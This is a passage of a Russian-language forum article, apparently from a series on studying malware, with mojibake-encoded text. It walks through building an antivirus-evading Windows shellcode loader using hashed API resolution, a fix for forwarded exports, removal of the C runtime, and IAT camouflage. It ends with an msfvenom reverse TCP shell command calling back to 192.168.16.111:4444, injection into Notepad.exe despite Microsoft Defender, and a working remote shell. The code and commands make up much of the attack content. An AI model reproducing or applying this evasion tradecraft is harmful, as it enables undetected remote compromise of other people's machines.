g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
    return FALSE;

// –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Kernel32.dll
g_Api.pGetModuleFileNameW          = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
g_Api.pCloseHandle                 = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
g_Api.pCreateFileW                 = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
g_Api.pGetTickCount64              = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
g_Api.pOpenProcess                 = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
g_Api.pSetFileInformationByHandle  = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
    return FALSE;

return TRUE;
}</code></pre>
	</div>
</div><br />
–•–µ—à–∏ WinAPI –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è –ø—Ä–æ–µ–∫—Ç–æ–º Hasher, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788266390.png"
		data-src="https://osint42.org/attachments/1746788266390-png.268/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788266390-png.268/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788266390.png"
			title="1746788266390.png"
			width="1099" height="445" loading="lazy" />
	</div><br />
<br />
–°–ª–µ–¥—É—é—â–∏–π —à–∞–≥ - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É g_Api –¥–ª—è –≤—ã–∑–æ–≤–∞ –≤—Å–µ—Ö —Ñ—É–Ω–∫—Ü–∏–π WinAPI, –¥–æ–±–∞–≤–∏–≤ –ø–µ—Ä–µ–¥ –∫–∞–∂–¥–æ–π –∏–∑ –Ω–∏—Ö –ø—Ä–µ—Ñ–∏–∫—Å g_Api.&lt;WinAPI&gt;. –ù–∞–ø—Ä–∏–º–µ—Ä, —Ñ—É–Ω–∫—Ü–∏—è OpenProcess –¥–æ–ª–∂–Ω–∞ –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∫–∞–∫ g_Api.pOpenProcess.<br />
<br />
<b>–û—à–∏–±–∫–∞ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è API SystemFunction032</b><br />
<br />
–ü—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –ø—Ä–∏–º–µ–Ω–∏—Ç—å —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ API –∫ —Ñ—É–Ω–∫—Ü–∏–∏ SystemFunction032 (–∫–æ—Ç–æ—Ä–∞—è –Ω–µ –≤–∫–ª—é—á–µ–Ω–∞ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä—É g_Api), –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç —Å–ª–µ–¥—É—é—â–µ–µ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788273799.png"
		data-src="https://osint42.org/attachments/1746788273799-png.269/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788273799-png.269/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788273799.png"
			title="1746788273799.png"
			width="1371" height="345" loading="lazy" />
	</div><br />
<br />
–ü—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å SystemFunction032 –ø–æ –∞–¥—Ä–µ—Å—É 0x00007FFC42C09FF2 –≤—ã–±—Ä–∞—Å—ã–≤–∞–µ—Ç—Å—è –∏—Å–∫–ª—é—á–µ–Ω–∏–µ. –ü–æ—Ö–æ–∂–µ, —ç—Ç–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å, —Ç–∞–∫ –∫–∞–∫ –æ–Ω –∏–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç—Ä–æ–∫–∏ –∫–æ–¥–∞:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA(&quot;Advapi32&quot;), SystemFunction032_JOAA);</code></pre>
	</div>
</div><br />
–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ xdbg, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∞–¥—Ä–µ—Å –∏ –ø–æ–Ω—è—Ç—å –ø—Ä–∏—á–∏–Ω—É –ø—Ä–æ–±–ª–µ–º—ã<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788282045.png"
		data-src="https://osint42.org/attachments/1746788282045-png.270/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788282045-png.270/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788282045.png"
			title="1746788282045.png"
			width="1242" height="187" loading="lazy" />
	</div><br />
<br />
<b>–§—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏</b><br />
<br />
–ê–¥—Ä–µ—Å, –ø–æ–ª—É—á–µ–Ω–Ω—ã–π —Å –ø–æ–º–æ—â—å—é GetProcAddressH, –Ω–µ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é, –∞ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Å—Ç—Ä–æ–∫—É &quot;CRYPTSP.SystemFunction032&quot;. –≠—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏, –∫–æ–≥–¥–∞ —Ñ—É–Ω–∫—Ü–∏—è, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –∏–∑ –æ–¥–Ω–æ–π DLL (DLL A), –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –¥—Ä—É–≥–æ–π DLL (DLL B).<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –≤–º–µ—Å—Ç–æ –∑–∞–≥—Ä—É–∑–∫–∏ Advapi32.dll (DLL A) –¥–ª—è –ø–æ–∏—Å–∫–∞ SystemFunction032 —Å–ª–µ–¥—É–µ—Ç –∑–∞–≥—Ä—É–∑–∏—Ç—å Cryptsp.dll (DLL B), —Ç–∞–∫ –∫–∞–∫ –æ–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏–π –∞–¥—Ä–µ—Å. –≠—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è —Å—Ç—Ä–æ–∫–æ–π &quot;CRYPTSP.SystemFunction032&quot;, –∫–æ—Ç–æ—Ä–∞—è –¥–∞–µ—Ç –Ω–∞–º–µ–∫ –Ω–∞ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏. –≠—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ, –ø–æ—Ç–æ–º—É —á—Ç–æ GetProcAddressH –Ω–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏. –í–Ω–µ—Å–µ–Ω–∏–µ–º —ç—Ç–æ–≥–æ –Ω–µ–∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ–≥–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∫–æ–¥ —Ç–µ–ø–µ—Ä—å –±—É–¥–µ—Ç —É—Å–ø–µ—à–Ω–æ –∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å—Å—è –∏ –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788289654.png"
		data-src="https://osint42.org/attachments/1746788289654-png.271/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788289654-png.271/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788289654.png"
			title="1746788289654.png"
			width="1649" height="614" loading="lazy" />
	</div><br />
<br />
<b>–£–¥–∞–ª–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT</b><br />
<br />
–°–ª–µ–¥—É—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è–º, –æ–ø–∏—Å–∞–Ω–Ω—ã–º –≤ –£–º–µ–Ω—å—à–µ–Ω–∏–µ –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –¥–µ—Ç–µ–∫—Ç–∞ –∑–≤–µ—Ä—å–∫–∞ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;, –º–æ–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫—É CRT.<br />
<br />
–û—à–∏–±–∫–∞ –≤–æ–∑–Ω–∏–∫–Ω–µ—Ç –∏–∑-–∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–π printf –∏ wprintf. –ß—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫—É—é —Ñ—É–Ω–∫—Ü–∏—é –¥–ª—è –∑–∞–º–µ–Ω—ã —ç—Ç–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π. –§—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –ø–µ—á–∞—Ç–∏ –±—É–¥–µ—Ç –≤–∫–ª—é—á–µ–Ω–∞ —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–Ω–æ–º —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏. –ó–∞–º–µ–Ω—ã —Ñ—É–Ω–∫—Ü–∏–π printf –∏ wprintf —Å–ª–µ–¥—É–µ—Ç —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ –Ω–æ–≤–æ–º —Ñ–∞–π–ª–µ —Å –∏–º–µ–Ω–µ–º Debug.h, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤–∫–ª—é—á–µ–Ω –≤–æ –≤—Å–µ —Ñ–∞–π–ª—ã, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–∑—ã–≤–∞—é—Ç printf –∏–ª–∏ wprintf.<br />
<br />
<b>Debug.h:</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once#include &lt;Windows.h&gt;// uncomment to enable debug mode
//\
#define DEBUG



#ifdef DEBUG// wprintf replacement
#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  // printf replacement
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  #endif // DEBUG</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Only print if debug mode is enabled
#ifdef DEBUGPRINTA(&quot;...&quot;);
#endif</code></pre>
	</div>
</div><br />
–ï—Å–ª–∏ –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ, –ø–æ—è–≤—è—Ç—Å—è –¥—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏, –ø–æ—Ç–æ–º—É —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ memcpy, memset, toupper —Ç–∞–∫–∂–µ –∏–º–ø–æ—Ä—Ç–∏—Ä—É—é—Ç—Å—è –∏–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT. –ß—Ç–æ–±—ã –∏—Å–ø—Ä–∞–≤–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ç—É –∂–µ –ª–æ–≥–∏–∫—É. –≠—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ —Ñ–∞–π–ª–µ WinApi.c, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />
<b>WinApi.c</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>CHAR _toUpper(CHAR C)
{
    if (C &gt;= &#039;a&#039; &amp;&amp; C &lt;= &#039;z&#039;)
        return C - &#039;a&#039; + &#039;A&#039;;

    return C;
}

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
    for (volatile int i = 0; i &lt; Size; i++) {
        ((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
    }
    return Destination;
}

extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)#pragma function(memset)void* __cdecl memset(void* Destination, int Value, size_t Size) {
    unsigned char* p = (unsigned char*)Destination;
    while (Size &gt; 0) {
        *p = (unsigned char)Value;
        p++;
        Size--;
    }
    return Destination;
}</code></pre>
	</div>
</div><br />
–ï—Å—Ç—å –µ—â–µ –æ–¥–Ω–∞ –æ—à–∏–±–∫–∞, –∫–æ—Ç–æ—Ä—É—é –Ω—É–∂–Ω–æ —Ä–µ—à–∏—Ç—å: –Ω–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π —Å–∏–º–≤–æ–ª _fltused. –°–∏–º–≤–æ–ª _fltused - —ç—Ç–æ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –≤ –±–∏–±–ª–∏–æ—Ç–µ–∫–µ CRT, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è, –±—ã–ª–∏ –ª–∏ –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å –ø–ª–∞–≤–∞—é—â–µ–π –∑–∞–ø—è—Ç–æ–π. –°–æ–∑–¥–∞–≤ –Ω–æ–≤—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é —Å –∏–º–µ–Ω–µ–º _fltused –∏ —É—Å—Ç–∞–Ω–æ–≤–∏–≤ –µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–∞ –Ω–æ–ª—å, –æ—à–∏–±–∫–∞ –±—É–¥–µ—Ç –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∞. –≠—Ç–æ –æ—Ç—Ä–∞–∂–∞–µ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –±–∏–±–ª–∏–æ—Ç–µ–∫–æ–π CRT, —á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Ç–æ–º—É, —á—Ç–æ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –ø–æ—Å—Ç—Ä–æ–∏—Ç –ø—Ä–æ–µ–∫—Ç –±–µ–∑ –æ—à–∏–±–æ–∫.<br />
<br />
<b>–ö–∞–º—É—Ñ–ª—è–∂ IAT</b><br />
<br />
–í –∫–∞—á–µ—Å—Ç–≤–µ –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ —à–∞–≥–∞ —Å–ª–µ–¥—É–µ—Ç –¥–æ–±–∞–≤–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ—á–Ω—ã–π —Ñ–∞–π–ª IatCamouflage.h, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç —Ç–æ—Ç –∂–µ –∫–æ–¥, —á—Ç–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω —Ç—É—Ç –£–º–µ–Ω—å—à–µ–Ω–∏–µ –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –¥–µ—Ç–µ–∫—Ç–∞ –∑–≤–µ—Ä—å–∫–∞ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;.<br />
<br />
IatCamouflage.h –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤–∫–ª—é—á–µ–Ω —Ç–æ–ª—å–∫–æ –≤ —Ñ–∞–π–ª main.c –∏ –≤—ã–∑–≤–∞–Ω –≤ –Ω–∞—á–∞–ª–µ –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, —á—Ç–æ–±—ã —Ç–∞–±–ª–∏—Ü–∞ –∞–¥—Ä–µ—Å–æ–≤ –∏–º–ø–æ—Ä—Ç–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –≤—ã–≥–ª—è–¥–µ–ª–∞ –¥–æ–±—Ä–æ—Å–æ–≤–µ—Å—Ç–Ω–æ.<br />
<br />
<b>–§–∏–Ω–∞–ª—å–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç</b><br />
<br />
–≠—Ç–∞ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–π TCP-—à–µ–ª–ª –æ—Ç Msfvenom, –∫–æ—Ç–æ—Ä—ã–π –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–π –Ω–∏–∂–µ.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin</code></pre>
	</div>
</div><br />
IAT AV.exe –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788838402.png"
		data-src="https://osint42.org/attachments/1746788838402-png.307/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788838402-png.307/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788838402.png"
			title="1746788838402.png"
			width="1279" height="756" loading="lazy" />
	</div><br />
<br />
–î–∞–ª–µ–µ AV.exe –≤–Ω–µ–¥—Ä—è–µ—Ç—Å—è –≤ Notepad.exe —Å –≤–∫–ª—é—á–µ–Ω–Ω—ã–º Microsoft Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788846084.png"
		data-src="https://osint42.org/attachments/1746788846084-png.308/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788846084-png.308/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788846084.png"
			title="1746788846084.png"
			width="1920" height="992" loading="lazy" />
	</div><br />
<br />
–£—Å–ø–µ—à–Ω–æ–µ –æ–±—Ä–∞—Ç–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è —Å –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω–æ–π, –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788869984.png"
		data-src="https://osint42.org/attachments/1746788869984-png.309/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788869984-png.309/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788869984.png"
			title="1746788869984.png"
			width="1444" height="817" loading="lazy" />
	</div><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å Notepad.exe –∏–º–µ–µ—Ç PID 20288, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å PID –Ω–∞ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788877409.png"
		data-src="https://osint42.org/attachments/1746788877409-png.310/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788877409-png.310/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788877409.png"
			title="1746788877409.png"
			width="1444" height="537" loading="lazy" />
	</div></div>
						

							<h2>–ü—Ä–æ Endpoint Detection and Response (EDR)</h2>

							

							

							<div class="bbWrapper"><b>–í–≤–µ–¥–µ–Ω–∏–µ </b><br />
<br />
Endpoint Detection and Response (EDR) ‚Äî —ç—Ç–æ —Ä–µ—à–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä–æ–µ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç –∏ —Ä–µ–∞–≥–∏—Ä—É–µ—Ç –Ω–∞ —É–≥—Ä–æ–∑—ã –≤—Ä–æ–¥–µ –≤—ã–º–æ–≥–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –ü–û –∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è. –ï–≥–æ —Ä–∞–±–æ—Ç–∞ –æ—Å–Ω–æ–≤–∞–Ω–∞ –Ω–∞ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–µ –∫–æ–Ω–µ—á–Ω—ã—Ö —Ç–æ—á–µ–∫ –≤ –ø–æ–∏—Å–∫–∞—Ö –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –ø—É—Ç–µ–º —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –æ —Ç–∞–∫–∏—Ö —Å–æ–±—ã—Ç–∏—è—Ö, –∫–∞–∫ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∂—É—Ä–Ω–∞–ª—ã, —Å–µ—Ç–µ–≤–æ–π —Ç—Ä–∞—Ñ–∏–∫, –º–µ–∂–ø—Ä–æ—Ü–µ—Å—Å–Ω–æ–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ (IPC), –≤—ã–∑–æ–≤—ã RPC, –ø–æ–ø—ã—Ç–∫–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.<br />
<br />
